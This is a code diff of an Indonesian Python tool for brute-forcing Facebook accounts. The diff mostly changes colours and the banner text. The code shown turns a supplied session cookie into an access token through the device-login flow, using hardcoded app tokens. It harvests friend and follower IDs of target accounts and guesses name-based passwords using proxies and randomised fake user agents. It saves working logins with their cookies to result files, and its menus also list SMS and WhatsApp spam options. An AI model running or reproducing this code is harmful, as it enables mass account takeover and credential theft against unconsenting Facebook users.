@@ -70,26 +70,26 @@ except Exception as e:
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['5.1.1','6.0.1','7.1.1','7.1.2','8.1.0'])
-	c='Redmi 3 Build/LMY47V; wv)'
+	b=random.choice(['4.0','5.0','6.0','7.0','8.0','4.1.1','5.1.1','6.0.1','71.1','7.1.2','8.1.0','8.1.1','9','10','11','12'])
+	c='Redmi Note 5A Prime Build/N2G47H)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 OPR/38.1.2254.136033'
+	i='Mobile Safari/537.36 OPT/1.5.15'
 	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uaku)
 	
-	a='Mozilla/5.0 (Linux; Android'
+	a='Mozilla/5.0 (Windows Phone 10.0; Android'
 	b=random.choice(['4.0','5.0','6.0','7.0','8.0','4.1.1','5.1.1','6.0.1','71.1','7.1.2','8.1.0','8.1.1','9','10','11','12'])
-	c='Redmi 7I Build/LMY47X)'
+	c='Microsoft; RM-1152)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
+	i='Mobile Safari/537.36 Edge/15.15254'
 	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uaku)
 	
@@ -210,13 +210,23 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	cetak(panel(f"""
-[bold red] ______ ___  _____  ___________  _____  _____ _   __ 
-[bold red] |  ___/ _ \/  __ \|  ___| ___ \|  _  ||  _  | | / /
-[bold red] | |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |[bold red]   SELAMAT MENUNAIKAN
-[bold white] |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |[bold white]   IBADAH PUASA 1441 H
-[bold white] | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |[bold cyan]   Version Script 2.8
-[bold white] \_|  \_| |_/\____/\____/\____/  \___/  \___/\_| \_/                                                                                                     
-             """,width=90,title=f"Banner",style=f"bold blue"))
+[bold red]_  _ ____    _  _ _ ____ ___ ____ ____ _   _                                      
+[bold red]|\ | |  |    |__| | [__   |  |  | |__/  \_/                                       
+[bold white]| \| |__|    |  | | ___]  |  |__| |  \   |                                        
+
+[bold white]TIDAK ADA SEJARAH                                                                                  
+[bold red]_  _ ____    ____ _  _ ___ _  _ ____ ____                                         
+[bold red]|\ | |  |    |___ |  |  |  |  | |__/ |___                                         
+[bold white]| \| |__|    |    |__|  |  |__| |  \ |___                                         
+
+[bold white]TIDAK ADA MASA DEPAN                                                                                  
+[bold red]_  _ ____    ____ ____ _    ____   ____ ____ _  _ ____ _ ___  ____ _  _ ____ ____ 
+[bold red]|\ | |  |    [__  |___ |    |___   |    |  | |\ | |___ | |  \ |___ |\ | [__  |___ 
+[bold white]| \| |__|    ___] |___ |___ |    . |___ |__| | \| |    | |__/ |___ | \| ___] |___ 
+[bold white]                                 '                                                
+[bold white]TIDAK ADA KEPERCAYAAN DIRI
+                                [bold cyan]By : MURDOCK-ID
+             """,width=90,title=f"[bold white]SELAMAT DATANG",style=f"bold red"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -242,30 +252,57 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold blue"))
+		cetak(nel('[bold white]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold red"))
 		your_cookies = input(' ╰─  Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
+				data = {
+				'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
+				'scope': ''
+				}
 				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
 				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
+				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
+				r.headers.pop(
+				'content-type'
+				)
+				r.headers.update({
+				'sec-fetch-mode': 'navigate',
+				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
+				'sec-fetch-site': 'cross-site',
+				'Host': 'm.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				'sec-fetch-dest': 'document',
+				})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r')
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
 					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
+					data = {
+					'fb_dtsg': fb_dtsg,
+					'jazoest': jazoest,
+					'qr': 0,
+					'user_code': user_code,
+					}
+					r.headers.update({
+					'origin': 'https://m.facebook.com',
+					'referer': verification_url,
+					'content-type': 'application/x-www-form-urlencoded',
+					'sec-fetch-site': 'same-origin',
+					})
 					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
 					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
+						r.headers.pop(
+						'content-type'
+						);r.headers.pop(
+						'origin'
+						)
 						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
+
 						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
 						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
 						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
@@ -276,18 +313,45 @@ def login_lagi334():
 						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
 						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
 						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
+						r.headers.update({
+						'origin': 'https://m.facebook.com',
+						'referer': response3.url,
+						'content-type': 'application/x-www-form-urlencoded',
+						})
+						data = {
+						'fb_dtsg': fb_dtsg,
+						'jazoest': jazoest,
+						'scope': scope,
+						'display': display,
+						'user_code': user_code,
+						'logger_id': logger_id,
+						'auth_type': auth_type,
+						'encrypted_post_body': encrypted_post_body,
+						'return_format[]': return_format,
+						}
 						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
 						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
+						r.headers.pop(
+						'content-type'
+						);r.headers.pop(
+						'origin'
+						)
+						r.headers.update({
+						'referer': 'https://m.facebook.com/',
+						})
 						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
 						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
+							r.headers.update({
+							'sec-fetch-mode': 'no-cors',
+							'referer': 'https://graph.facebook.com/',
+							'Host': 'graph.facebook.com',
+							'accept': '*/*',
+							'sec-fetch-dest': 'script',
+							'sec-fetch-site': 'cross-site',
+							})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n ╰─  Token : {access_token}")
+							print(f"\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] Token :\x1b[1;92m {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
 							print("\n ╰─  Login Berhasil | python brute.py");exit()
@@ -311,9 +375,9 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold cyan]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold cyan]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold cyan]{ip}[/][/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User STATUS  : [bold green] UNTUK UMAT[bold green]',width=90,title=f"[bold cyan]Infomasi",style=f"bold blue"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold cyan] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold cyan] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Cek Result [[bold cyan] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold yellow]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold cyan]List Menu",style=f"bold blue"))
-	cetak(panel(f'[bold white]Ketik [bold green]"Lainnya"[bold white] Untuk Melihat Menu Tambahan | Ketik [bold green]"Bot"[bold white] Untuk Ke Menu Tambahan',width=90,title=f"[bold cyan]Informasi Crack",style=f"bold blue"))
+	cetak(panel(f'[bold white][[bold red]•[/][bold white]][/] [bold white]Username : [bold red]{my_name}[/]\n[bold white][[bold red]•[/][bold white]][/] [bold white]User Idz : [bold red]{my_id}[/]\n[bold white][[bold red]•[/][bold white]][/] [bold white]User Ip  : [bold red]{ip}[/][/]\n[bold white][[bold red]•[/][bold white]][/] [bold white]User STATUS  : [bold white] UNTUK PRIBADI[bold red]',width=90,title=f"[bold white]Infomasi",style=f"bold red"))
+	cetak(panel(f'[bold white][[bold red]01[/][bold white]][/] [bold white]Crack Publick [[bold red] ON [bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Crack Massal [[bold red] ON [bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Cek Result [[bold red] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/] [bold white]Hapus Cookies [bold white][[bold red] ON [bold white]][/]',width=90,title=f"[bold white]List Menu",style=f"bold red"))
+	cetak(panel(f'[bold white]Ketik [bold red]"Lainnya"[bold white] Untuk Melihat Menu Tambahan | Ketik [bold red]"Bot"[bold white] Untuk Ke Menu Tambahan',width=90,title=f"[bold white]Informasi Crack",style=f"bold red"))
 	_____brayennn___xd____ = input(f' ╰─  Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
 		brayen_dump()
@@ -339,7 +403,7 @@ def error():
 	back() 
 ###----------[ CRACK DARI KOMEN ]---------- ###
 def komen():
-	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold blue"))
+	cetak(panel(f"[bold white]Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold red"))
 	ide = input(f' ╰─  Masukan Id Postingan : ')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
@@ -372,7 +436,7 @@ def pengikut():
 	except IOError:
 		exit()
 	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold blue"))
+	cetak(panel(f"[bold red]Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold red"))
 	akun = console.input(f' ╰─  Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
@@ -394,7 +458,7 @@ def pengikut():
 
 #----------------------[ MENU CRACK ]----------------------#
 def bot():
-	cetak(panel(f"[01] Cek Opsi Cp [[bold green] ON [bold white]]                  [03] Spam WhatsApp [[bold green] ON [bold white]]\n[02] Spam Sms [[bold green] ON [bold white]]                     [04] Kembali Ke Awal [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,8),style=f"bold blue"))
+	cetak(panel(f"[01] Cek Opsi Cp [[bold red] ON [bold white]]                  [03] Spam WhatsApp [[bold red] ON [bold white]]\n[02] Spam Sms [[bold red] ON [bold white]]                     [04] Kembali Ke Awal [[bold red] ON [bold white]]",width=90,title=f"[bold white]Menu Bot",padding=(0,8),style=f"bold red"))
 	bray = input(f' ╰─  Pilih Menu Crack : ')
 	if bray in(''):
 		print(' ╰─  Pilih Yang Bener Asu ');back()
@@ -409,7 +473,7 @@ def bot():
 		
 #----------------------[ MENU CRACK V2 ]----------------------#
 def lainnya():
-	cetak(panel(f"[01] Crack Username [[bold green] ON [bold white]]                  [03] Crack File [[bold green] ON [bold white]]\n[02] Crack Followers [[bold green] ON [bold white]]                 [04] Kembali Ke Awal [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold blue"))
+	cetak(panel(f"[01] Crack Username [[bold red] ON [bold white]]                  [03] Crack File [[bold red] ON [bold white]]\n[02] Crack Followers [[bold red] ON [bold white]]                 [04] Kembali Ke Awal [[bold red] ON [bold white]]",width=90,title=f"[bold white]Menu Crack",padding=(0,8),style=f"bold red"))
 	bray = input(f' ╰─  Pilih Menu Crack : ')
 	if bray in(''):
 		print(' ╰─  Pilih Yang Bener Asu ');back()
@@ -427,7 +491,7 @@ def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold blue"))
+	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold red"))
 	nam = console.input(f' ╰─  Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
@@ -1037,7 +1101,7 @@ def crack_file():
 		setting()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold blue]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold blue"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold red]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold red]• [/][bold white]List Menu Cek[/][bold white] •[/]",style=f"bold red"))
 	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
@@ -1138,7 +1202,7 @@ def brayen_dump():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold blue'))
+	cetak(panel('\t            [bold white]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold red'))
 	pil = input(f' ╰─  Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
@@ -1146,7 +1210,7 @@ def brayen_dump():
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print('')
-		print(f' ╰─  Total ID yang Terkumpul : {h}'+str(len(id)))
+		print(f' ╰─  Total ID yang Terkumpul : {m}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(' ╰─  Internet Lu Gak Ada Anjing')
@@ -1162,7 +1226,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold blue"))
+		cetak(panel('\t            [bold white]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red]Crack Massal",style=f"bold red"))
 		jum = int(input(f' ╰─  {P}Mau Berapa Idz Target {x} : '))
 	except ValueError:
 		print(' ╰─  Wrong input ')
@@ -1191,7 +1255,7 @@ def dump_massal():
 			print(' ╰─  Unstable Signal ')
 			exit()
 	try:
-		print(f' ╰─  {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
+		print(f' ╰─  {P}Total Idz Target Yang Terkumpul{x} : {m}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -1204,7 +1268,7 @@ def dump_massal():
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [[bold cyan]Good Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Random [[bold cyan]Good Recommended[bold white]][/]',width=90,title=f"[bold cyan]Setting Urutan Idz",style=f"bold blue"))
+	cetak(panel(f'[bold white][[bold red]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Crack Idz New [[bold red]Good Recommended[bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Crack Idz Random [[bold red]Good Recommended[bold white]][/]',width=90,title=f"[bold white]Setting Urutan Idz",style=f"bold red"))
 	hu = input(f' ╰─  Pilih Urutan id : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -1226,7 +1290,7 @@ def setting():
 	else:
 		print(' ╰─  Pilih Yang Bener Kontooll ')
 		exit()
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold cyan]Good Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic [[bold cyan]Good Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode B-Air [[bold red] Not Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbeta [[bold cyan]Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode Async [[bold cyan]Good Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode Reguler [[bold cyan]Recommended[bold white]][/]',width=90,title=f"[bold cyan]Setting Metode",style=f"bold blue"))
+	cetak(panel(f'[bold white][[bold red]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold red]Good Recommended[bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Metode Mbasic [[bold red]Good Recommended[bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Metode B-Air [[bold red] Not Recommended[bold white]][/]\n[bold white][[bold red]04[/][bold white]][/] [bold white]Metode Mbeta [[bold red]Recommended[bold white]][/]\n[bold white][[bold red]05[/][bold white]][/] [bold white]Metode Async [[bold red]Good Recommended[bold white]][/]\n[bold white][[bold red]06[/][bold white]][/] [bold white]Metode Reguler [[bold red]Recommended[bold white]][/]',width=90,title=f"[bold white]Setting Metode",style=f"bold red"))
 	hc = input(f' ╰─  Pilih Metode : ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -1242,9 +1306,9 @@ def setting():
 	    method.append('reguler')
 	else:
 		method.append('mobile')
-	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold cyan]Good Recommended[bold white]]
-[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold cyan]Good Recommended[bold white]]
-[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold blue',title='[bold cyan]Setting Password',width=90))
+	cetak(panel('''[bold white][[bold red]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold red]Good Recommended[bold white]]
+[bold white][[bold red]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold red]Good Recommended[bold white]]
+[bold white][[bold red]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold red',title='[bold white]Setting Password',width=90))
 	pwplus=input(f' ╰─  {P}Pilih sandi : ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
@@ -1255,7 +1319,7 @@ def setting():
 	else:
 		pwpluss.append('no')
 		
-	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold cyan]Setting User-Agent",style=f"bold blue"))
+	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold white]Setting User-Agent",style=f"bold red"))
 	uatambah = input(f' ╰─  Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
@@ -1269,10 +1333,10 @@ def passwrd():
 	global prog,des
 	print('')
 	urut = []
-	urut.append(panel(f'        [bold green]%s [bold blue]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold blue"))
-	urut.append(panel(f'         [bold yellow]%s [bold blue]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold blue"))
+	urut.append(panel(f'        [bold white]%s [bold white]'%(okc),width=43,title=f"[bold red]OK SAVE IN",style=f"bold red"))
+	urut.append(panel(f'         [bold white]%s [bold white]'%(cpc),width=44,title=f"[bold white]CP SAVE IN",style=f"bold red"))
 	wa.print(Columns(urut))
-	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold yellow]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold blue"))
+	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold white]Informasi",subtitle=f"[bold white]Proses Crack",style=f"bold red"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -1331,7 +1395,7 @@ def crack(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1347,7 +1411,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1358,7 +1422,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1376,7 +1440,7 @@ def crackmobilev2(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1392,7 +1456,7 @@ def crackmobilev2(idf,pwv):
 			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1403,7 +1467,7 @@ def crackmobilev2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1421,7 +1485,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1437,7 +1501,7 @@ def crackmbasic(idf,pwv):
